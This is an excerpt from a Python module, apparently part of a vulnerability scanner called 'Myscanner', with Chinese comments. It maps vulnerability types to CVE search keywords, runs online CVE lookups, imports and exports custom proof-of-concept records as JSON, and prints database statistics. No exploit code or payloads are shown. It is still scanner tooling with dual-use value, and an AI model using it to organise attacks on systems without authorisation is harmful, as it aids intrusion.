            print(f"{Fore.YELLOW}[!] 在线查询超时{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] 在线查询出错: {e}{Style.RESET_ALL}")
        
        return results
    
    def _match_online(self, vuln_type, detail, target):
        """在线比对：根据漏洞类型关键词查询CVE"""
        online_results = []
        
        # 将漏洞类型映射为搜索关键词
        type_keywords = {
            'sqli': 'sql injection',
            'xss': 'cross site scripting',
            'lfi': 'path traversal file inclusion',
            'rce': 'remote code execution',
            'ssrf': 'server side request forgery',
            'unauth': 'authentication bypass unauthorized',
            'info_leak': 'information disclosure',
            'xxe': 'xml external entity',
            'deser': 'deserialization vulnerability'
        }
        
        keyword = type_keywords.get(vuln_type, vuln_type)
        
        # 从detail中提取额外关键词（如框架名）
        extra_kw = ''
        framework_keywords = ['spring', 'struts', 'tomcat', 'nginx', 'apache', 'iis',
                              'wordpress', 'django', 'flask', 'laravel', 'thinkphp']
        if detail:
            for fw in framework_keywords:
                if fw in detail.lower():
                    extra_kw = fw
                    break
        
        search_term = f"{extra_kw} {keyword}".strip() if extra_kw else keyword
        
        # 执行在线搜索
        cves = self.query_cve_online(keyword=search_term, limit=5)
        
        for cve in cves:
            cve['matched_target'] = target
            cve['match_mode'] = 'online'
            online_results.append(cve)
        
        return online_results
    
    # ==================== 导入/导出 ====================
    
    def export_pocs(self, output_file=None):
        """
        导出自定义POC为JSON文件
        
        参数:
            output_file: 输出路径 (可选)
            
        返回:
            str: 导出的文件路径
        """
        if not self.data.get('custom_pocs'):
            print(f"{Fore.YELLOW}[!] 没有自定义POC可导出{Style.RESET_ALL}")
            return None
        
        output_file = output_file or os.path.join(CUSTOM_POC_DIR, 
                                                   f"custom_pocs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        
        export_data = {
            'export_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'total_count': len(self.data['custom_pocs']),
            'pocs': self.data['custom_pocs']
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, ensure_ascii=False, indent=2)
        
        print(f"{Fore.GREEN}[+] 已导出 {len(self.data['custom_pocs'])} 条自定义POC到: {output_file}{Style.RESET_ALL}")
        return output_file
    
    def import_pocs(self, input_file):
        """
        从JSON文件导入POC
        
        参数:
            input_file: JSON文件路径
            
        返回:
            int: 成功导入的数量
        """
        if not os.path.exists(input_file):
            print(f"{Fore.RED}[-] 文件不存在: {input_file}{Style.RESET_ALL}")
            return 0
        
        try:
            with open(input_file, 'r', encoding='utf-8') as f:
                import_data = json.load(f)
            
            pocs_to_import = import_data.get('pocs', [])
            if isinstance(import_data, list):
                pocs_to_import = import_data
            
            count = 0
            for poc in pocs_to_import:
                # 移除旧ID，重新生成
                poc.pop('id', None)
                self.add_custom_poc(poc)
                count += 1
            
            print(f"{Fore.GREEN}[+] 成功导入 {count} 条POC{Style.RESET_ALL}")
            return count
            
        except Exception as e:
            print(f"{Fore.RED}[-] 导入失败: {e}{Style.RESET_ALL}")
            return 0
    
    # ==================== 统计信息 ====================
    
    def get_stats(self):
        """获取数据库统计信息"""
        built_in = len(self.data.get('pocs', []))
        custom = len(self.data.get('custom_pocs', []))
        cached_cves = len(self.data.get('cve_cache', {}))
        
        # 按类别统计
        cat_count = {}
        all_pocs = self.data.get('pocs', []) + self.data.get('custom_pocs', [])
        for poc in all_pocs:
            cat = poc.get('category', 'unknown')
            cat_count[cat] = cat_count.get(cat, 0) + 1
        
        stats = {
            'total_pocs': built_in + custom,
            'built_in': built_in,
            'custom': custom,
            'cached_cves': cached_cves,
            'by_category': cat_count,
            'last_updated': self.data.get('last_updated'),
            'db_version': self.data.get('version')
        }
        
        print(f"\n{'='*50}")
        print(f"  漏洞数据库统计")
        print(f"{'='*50}")
        print(f"  内置POC:     {stats['built_in']} 条")
        print(f"  自定义POC:   {stats['custom']} 条")
        print(f"  缓存CVE:     {stats['cached_cves']} 条")
        print(f"  总计:         {stats['total_pocs']} 条")
        print(f"  最后更新:    {stats['last_updated']}")
        print(f"\n  按类别分布:")
        for cat, cnt in sorted(stats['by_category'].items()):
            cat_name = self.data['categories'].get(cat, {}).get('name', cat)
            print(f"    {cat_name}: {cnt} 条")
        print(f"{'='*50}\n")
        
        return stats


# ==================== 快捷函数 ====================

def get_db():
    """获取全局数据库实例（单例）"""
    if not hasattr(get_db, '_instance'):
        get_db._instance = VulnDatabase()
    return get_db._instance


if __name__ == '__main__':
    # 测试运行
    print(Fore.CYAN + "="*60 + Style.RESET_ALL)
    print(Fore.CYAN + "  Myscanner 漏洞数据库模块测试" + Style.RESET_ALL)
    print(Fore.CYAN + "="*60 + Style.RESET_ALL + "\n")
    
    db = VulnDatabase()
    
    # 显示统计
    db.get_stats()
    
    # 列出所有POC
    db.list_all_pocs(show_details=True)
    
    # 测试搜索
    db.search_poc('SQL')
